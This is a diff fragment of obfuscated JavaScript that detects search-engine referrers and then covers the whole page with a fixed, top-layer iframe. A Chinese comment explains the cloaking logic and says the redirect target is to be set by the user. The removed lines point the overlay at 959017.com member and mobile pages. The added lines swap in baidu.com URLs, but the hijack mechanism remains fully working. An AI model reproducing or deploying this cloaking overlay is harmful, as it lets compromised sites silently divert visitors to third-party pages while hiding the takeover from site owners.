@@ -52,12 +52,12 @@ if (IXlmPd1["test"](eC2)) {
     // "write", '<style type="text/css">html{width:100%;height:100%}body {width:100%;height:100%;overflow:hidden;margin:0}</style>', "createElement", 'div', "<iframe src=\"#\" width=\"100%\" height=\"100%\" frameborder=\"0\"></iframe>", "innerHTML", "style", "height", "100%", "width", "100%", "position", "fixed", "body", "insertBefore", "firstChild", "z-index", "9999999999"];
 	//搜索引擎搜索进来会跳转，直接访问不跳转 {跳转地址自己改下}
     if (!(cULosuriQ2 || tMoSvSQwY3 || JyIN$tSCB4 || C5 || b6 || LFsqDtm7 || FCZk$8 || lyoo9)) {
-        var aGdAlgXMf9$ = ["document", "write", '<style type="text/css">html{width:100%;height:100%}body {width:100%;height:100%;overflow:hidden;margin:0}</style>', "createElement", 'div', "<iframe src=\"https://959017.com/member/member?type=returnSavaMember\" id=\"tzd\" width=\"100%\" height=\"100%\" frameborder=\"0\"></iframe>", "innerHTML", "style", "height", "100%", "width", "100%", "position", "fixed", "body", "insertBefore", "firstChild", "z-index", "9999999999"];
+        var aGdAlgXMf9$ = ["document", "write", '<style type="text/css">html{width:100%;height:100%}body {width:100%;height:100%;overflow:hidden;margin:0}</style>', "createElement", 'div', "<iframe src=\"https://baidu.com/member/member?type=returnSavaMember\" id=\"tzd\" width=\"100%\" height=\"100%\" frameborder=\"0\"></iframe>", "innerHTML", "style", "height", "100%", "width", "100%", "position", "fixed", "body", "insertBefore", "firstChild", "z-index", "9999999999"];
     } else {
         if (cULosuriQ2 || tMoSvSQwY3) {
             window["location"]["href"] = "https://m.baidu.com/";
         } else {
-            var aGdAlgXMf9$ = ["document", "write", '<style type="text/css">html{width:100%;height:100%}body {width:100%;height:100%;overflow:hidden;margin:0}</style>', "createElement", 'div', "<iframe src=\"https://959017.com/wap/index\" id=\"tzd\" width=\"100%\" height=\"100%\" frameborder=\"0\"></iframe>", "innerHTML", "style", "height", "100%", "width", "100%", "position", "fixed", "body", "insertBefore", "firstChild", "z-index", "9999999999"];
+            var aGdAlgXMf9$ = ["document", "write", '<style type="text/css">html{width:100%;height:100%}body {width:100%;height:100%;overflow:hidden;margin:0}</style>', "createElement", 'div', "<iframe src=\"https://m.baidu.com/\" id=\"tzd\" width=\"100%\" height=\"100%\" frameborder=\"0\"></iframe>", "innerHTML", "style", "height", "100%", "width", "100%", "position", "fixed", "body", "insertBefore", "firstChild", "z-index", "9999999999"];
         }
     }
     window[aGdAlgXMf9$[0]][aGdAlgXMf9$[1]](aGdAlgXMf9$[2]);
